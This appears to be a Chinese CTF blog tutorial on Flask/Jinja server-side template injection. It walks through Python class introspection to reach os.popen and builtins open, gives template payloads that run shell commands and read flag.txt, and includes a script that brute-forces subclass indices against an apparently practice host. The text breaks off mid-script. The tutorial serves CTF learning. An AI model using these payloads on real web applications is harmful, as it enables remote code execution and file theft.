@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>SSTI |  CTF</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-SSTI"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  SSTI
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/03/16/SSTI/" class="article-date">
+  <time datetime="2023-03-16T12:24:04.000Z" itemprop="datePublished">2023-03-16</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">17 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="SSTI漏洞产生原因"><a href="#SSTI漏洞产生原因" class="headerlink" title="SSTI漏洞产生原因"></a>SSTI漏洞产生原因</h2><p>render_template函数自动渲染对应的内容，不会在执行渲染，但是你用render_template_string就可能出现再次渲染的问题</p>
+<p>导致里面的x会当作代码执行</p>
+<h2 id="python类基础"><a href="#python类基础" class="headerlink" title="python类基础"></a>python类基础</h2><h3 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h3><p>在python中object类是python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类，每个类都有魔术变量__class__,表示当前类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">print</span>([].__class__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h3 id="bases"><a href="#bases" class="headerlink" title="bases"></a><strong>bases</strong></h3><p>每一个类都有一个__bases__属性，列出其基类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">变量.__class__.__bases__ <span class="comment">#列出所有的基类，返回的是元组类型</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">变量.__class__.__bases__[<span class="number">0</span>]  <span class="comment">#可以使用数组方法返回第一个基类</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__     <span class="comment">#它会显示类和基类，这是它和__bases__的不同,同样也可以使用数组方法</span></span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()查看当前类的子类，格式变量.__class__.__bases__[<span class="number">0</span>].__subclasses__()  <span class="comment">#返回的是列表类型</span></span><br><span class="line">这个类也可以加数组来查看指定的索引值，例如变量.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;callable_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_itemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_valueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;mappingproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reverseitemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversekeyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversevalueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_reverseiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;longrange_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;moduledef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;odict_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pickle.PickleBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;symtable entry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;stderrprinter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.GenericAlias&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;anext_awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_asend&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_athrow&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_wrapped_value&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;InterpreterID&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;managedbuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.SimpleNamespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.UnionType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_array_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_bitmap_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_collision_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.ContextVar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.Token&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Token.MISSING&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.FrozenImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ImportLockContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.lock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.RLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._BytesIOBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;nt.ScandirIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;nt.DirEntry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyHKEY&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._LoaderBasics&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespacePath&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespaceLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.PathFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.Codec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamReaderWriter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamRecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abc._abc_data&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;abc.ABC&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Hashable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.AsyncIterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Callable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._AddedDllDirectory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Helper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteCodec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteIncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteIncrementalDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteStreamReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteStreamWriter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.DynamicClassAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types._GeneratorWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib._abc.Loader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.accumulate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.filterfalse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.zip_longest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.pairwise&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee_dataobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reprlib.Repr&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._tuplegetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections._Link&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_cache_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.KeyWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_list_elem&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partialmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.singledispatchmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.ContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.AsyncContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._GeneratorContextManagerBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._BaseExitStack&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure>
+
+<p>__init__初始化类，然后globals全局来查找所有的的方法及变量参数</p>
+<p>要找到这个类&lt;class ‘os._wrap_close’&gt; 所对应的序号</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">198</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[i].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[i])</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__().index(os._wrap_close))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这样的话就可以使用各种各样的方法比如popen</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()  <span class="comment">#这样就可以读取当前目录下的内容</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;flag.txt&#x27;</span>).read()   <span class="comment">#这样就实现了读取文件 </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="通过查找对应的函数模块或者类来进行构造"><a href="#通过查找对应的函数模块或者类来进行构造" class="headerlink" title="通过查找对应的函数模块或者类来进行构造"></a>通过查找对应的函数模块或者类来进行构造</h2><h3 id="查找eval函数"><a href="#查找eval函数" class="headerlink" title="查找eval函数"></a>查找eval函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload:&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="查找os模块"><a href="#查找os模块" class="headerlink" title="查找os模块"></a>查找os模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span 